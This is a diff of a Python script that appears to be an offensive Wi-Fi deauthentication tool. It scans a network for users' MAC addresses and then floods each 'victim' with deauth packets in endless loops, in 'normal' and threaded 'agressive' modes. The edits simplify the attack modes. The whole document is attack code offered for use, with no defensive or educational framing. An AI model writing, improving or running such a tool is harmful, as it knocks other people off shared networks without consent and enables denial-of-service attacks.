@@ -65,7 +65,6 @@ def interface():
         print(Fore.RED + "[!]Unable to determine connected interface.")
         exit()
 def scanning(network_ip):
-    #looks stupid, right? I'll change it someday
     print(Fore.YELLOW + "=+-+-+IP-+-+-+-+-+-+-MAC-+-+-+-=")
     def main(first,last):
         for search in range(first, last):
@@ -142,45 +141,36 @@ interface()
 #----MAIN--------------------------------------------------------------------------------------------
 
 scanning(network_ip)
-time.sleep(20)
+time.sleep(19)
 print(Fore.YELLOW + "=+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-=")
 print(Fore.YELLOW + "— — — — — — — — — — — — — — — — — — — — — — —— — ")
-mode = int(input(Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA + ']' + "Select mode:\n" + Fore.WHITE + "[1] - light\n[2] - normal \n[3] - agressive(not recommended)\n" + Fore.MAGENTA + "[" + Fore.YELLOW + '>' + Fore.MAGENTA + ']'))
+mode = int(input(Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA + ']' + "Select mode:\n" + Fore.WHITE + "[1] - normal\n[2] - agressive\n" + Fore.MAGENTA + "[" + Fore.YELLOW + '>' + Fore.MAGENTA + ']'))
 #checking if mac list is empty
 if mac_list:
     pass
 else:
     print(Fore.RED +"[!]It looks like no users were found. Try to restart the program\n")
     exit()
-print(random.choice(random_color) + Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA+ ']' + "De-authenticating all network users except you...\n" + Fore.RED + "[*]Ctrl + Z to stop and exit" + Fore.GREEN)
+
+#deauthing
+print(random.choice(random_color) + Fore.MAGENTA + "[" + Fore.YELLOW + '*' + Fore.MAGENTA+ ']' + "De-authenticating all network users...\n" + Fore.RED + "[*]Ctrl + Z to stop and exit" + Fore.GREEN)
 if mode == 1:
     amount = 1000
     while True:
         for victim in mac_list:
             print(random.choice(random_color) + '\r', victim, end='', flush=True)
             fuckem(victim,gatewaymac,amount)
-
 elif mode == 2:
-    amount = 1200
-    for victim in mac_list:
-        thread = threading.Thread(target=fuckem, args=(victim,gatewaymac,amount))
-        thread.start()
-    while True:
-         for listing in mac_list:
-             print(random.choice(random_color) + '\r', victim, end='', flush=True)
-elif mode == 3:
     amount = 1000
     while True:
         for victim in mac_list:
             if x == 100:
                 x = 0
                 time.sleep(10)
-        print(random.choice(random_color) + '\r', victim, end='', flush=True)
-        thread = threading.Thread(target=fuckem, args=(victim,gatewaymac,amount))
-        thread.start()
-        x += 1
+            print(random.choice(random_color) + '\r', victim, end='', flush=True)
+            thread = threading.Thread(target=fuckem, args=(victim,gatewaymac,amount))
+            thread.start()
+            x += 1
 
 
 #----------------------------------------------------------------------------------------------------
-
-
